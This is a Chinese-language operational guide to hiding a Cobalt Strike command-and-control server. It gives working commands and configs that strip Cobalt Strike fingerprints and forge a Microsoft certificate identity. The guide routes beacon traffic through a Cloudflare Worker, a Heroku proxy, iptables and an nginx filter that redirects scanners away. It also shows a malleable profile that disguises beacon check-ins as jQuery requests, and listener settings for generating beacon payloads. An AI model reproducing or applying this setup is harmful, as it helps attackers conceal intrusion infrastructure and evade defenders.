# Cobaltstrike yc

---

**介绍**

```
主机隐藏: cloudflare + heroku反代 + 防火墙 + nginx反代 
流量伪装: CS规则配置  
```

---
**CS特征去除**

```
修改cs端口50050->10080
sed -i 's/50050/10080/g' teamserver   # 需要启动前设置

删除cs的证书特征
rm ./cobaltstrike.store
sed -i 's!-alias cobaltstrike -dname "CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth"!-alias microsoft.com -dname "CN=Microsoft Windows, OU=MOPR, O=Microsoft Corporation, L=Redmond, ST=Washington, C=US"!g' teamserver
```
---

**CS主机隐藏过程**

```
cloudflare cdn-work -> Heroku反向代理  -> VPS防火墙路由转发80转8080 ->VPS nginx反向代理 8080转8089
                                         VPS 防火墙使8089只能本地访问，其他端口默认放行
                                         cs配置监听器 1.监听器cdn配置80；2.监听器cdn配置8080转8089
                                         如需要https加密，设置证书，走443即可
                                         域名可用可不用
```

1.CDN-worker伪装

```
注册账号：https://dash.cloudflare.com/
优点：可以根据cs监听端口模块http/https进行自动切换协议
缺点：
    Cloudflare支持的HTTP端口是：80,8080,8880,2052,2082,2086,2095
    Cloudflare支持的HTTPs端口是：443,2053,2083,2087,2096,8443
    如：http://cdn:80 =>vps:80    |   https://cdn:443 =>vps:443
配置work，work配置js，下面地址改成heroku的反向代理地址
---
let upstream = 'http://xxx.com'

addEventListener('fetch', event => {
event.respondWith(fetchAndApply(event.request));
})
async function fetchAndApply(request) {
const ipAddress = request.headers.get('cf-connecting-ip') || '';
let requestURL = new URL(request.url);
let upstreamURL = new URL(upstream);
requestURL.protocol = upstreamURL.protocol;
requestURL.host = upstreamURL.host;
requestURL.pathname = upstreamURL.pathname + requestURL.pathname;


let new_request_headers = new Headers(request.headers);
new_request_headers.set("X-Forwarded-For", ipAddress);
let fetchedResponse = await fetch(
new Request(requestURL, {
method: request.method,
headers: new_request_headers,
body: request.body
})
);
let modifiedResponseHeaders = new Headers(fetchedResponse.headers);
modifiedResponseHeaders.delete('set-cookie');
return new Response(
fetchedResponse.body,
{
headers: modifiedResponseHeaders,
status: fetchedResponse.status,
statusText: fetchedResponse.statusText
}
);
}
```

2.heroku反向代理

```
注册账号：https://id.heroku.com/login
使用该链接生成app：
	https://dashboard.heroku.com/new?template=https://github.com/FunnyWolf/nginx-proxy-heroku	
    设置app名
    proxy target http://vps地址:80   | https://vps
生成app名.herokuapp.com的反代域名
作用：流量到app名.herokuapp.com，转发到proxy target设置的地址
局限：只能这样访问不能加端口  http://app名.herokuapp.com   |   https://app名.herokuapp.com
```

3.nginx反向代理

```
只允许固定jq文件和user-agent访问，否则重定向其他网站
配置文件：
---
listen 8080
location ~ ^(/jquery-3.3.1.slim.min.js.*|/jquery-3.3.2.min.js.*|/jquery-3.3.1.min.js.*|/jquery-3.3.2.slim.min.js.*)$ {
        if ($http_user_agent != "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko") {
        return 302 https://www.sohu.com/;
        }
        proxy_pass          http://127.0.0.1:8899;

        # If you want to pass the C2 server's "Server" header through then uncomment this line
        # proxy_pass_header Server;
        expires             off;
        proxy_redirect      off;
        proxy_set_header    Host                $host;
        proxy_set_header    X-Forwarded-For     $proxy_add_x_forwarded_for;   # 这一项使cs上显示目标服务器的IP，否则会是127.0.0.1
        proxy_set_header    X-Real-IP           $remote_addr;
}
```

4.防火墙配置

```
开发路由转发功能：echo 1 > /proc/sys/net/ipv4/ip_forward
路由转发：
iptables -t nat -A PREROUTING -p tcp -i eth0 -d 192.227.194.169 --dport 80 -j DNAT --to 192.227.194.169:8080
防火墙配置：
sudo ufw enable  #开启防火墙
sudo ufw default allow #默认允许连接
sudo ufw allow from 127.0.0.1 to any port 8899 #只允许本地访问8899,其他外网拒绝访问。
sudo ufw deny 8899/tcp  #拒绝所有IP连接8899
sudo ufw allow from 113.90.178.52/24 to any port 50050 #允许某个IP访问50050
sudo ufw deny 50050/tcp  #拒绝所有IP连接50050
```

5.cs监听器设置

```
cs监听器设置
1.cdn 80
	模块：windows/beacon_http/reverse_http
	http hosts:  cdn地址
	http host(stager):  cdn地址
	http port （c2）: 80      # 这里得设置CDN支持转发的端口
	profile:default
2.cdn 8080->8089
	模块：windows/beacon_http/reverse_http
	http hosts:  cdn地址
	http host(stager):  cdn地址   
	http port （c2）: 8080    # 这里得设置CDN支持转发的端口
	http port （Bind）：8089
	profile:default
	
生成shellcode和exe使用第一个cdn的80生成

PS：
1.http host(stager)=>beacons该字段会在流量请求中使用到，不能设置自己的域名和IP
2.走443端口加密的流量，模块使用https
```

---

**CS流量伪装过程**

```
判断是否上线http-stager： （首次上线的流量过程）
exe -> CDN/jxx.1.slim.min.js(80) -> heroku(80) -> 防火墙80=8080 -> nginx反代8080=8089 -> 监听器2的8089

执行命令http-get、http-post等：（每次执行命令的流量过程） 
exe -> CDN/jxx.min.js(8080) -> heroku(80) -> nginx反代8080=8089 -> 监听器2的8089
```

cs流量伪装（具体伪装规则需自行百度编写）

```
# 判断上线流量伪装
http-stager { 
    set uri_x86 "/jxx.sx.min.js";
    set uri_x64 "/jxx.sx.min.js";

    server {
        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/*; charset=utf-8";
        output {
        	xxx
        }
        
# 执行命令流量伪装        
http-get {
    set uri "/jxxx.min.js";
    set verb "GET";
    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        #header "Host" "dawn-field-67cf.linkedims.workers.dev";  ## 这里走CDN的话就不要配，不然可能扰乱CDN的转发。
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";
        metadata {
            base64url;
            prepend "__xxxuid=";
            header "Cookie";
        }
    }
```

